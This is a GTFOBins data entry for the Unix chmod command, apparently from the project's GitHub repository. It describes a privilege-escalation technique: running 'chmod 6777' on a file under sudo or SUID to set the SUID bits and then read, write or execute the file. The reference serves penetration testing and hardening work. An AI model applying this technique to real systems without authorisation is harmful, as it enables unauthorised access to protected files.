<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/chmod -->
---
functions:
  privilege-escalation:
  - code: |-
      chmod 6777 /path/to/input-file
    comment: |-
      This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.
    contexts:
      sudo:
      suid:
...
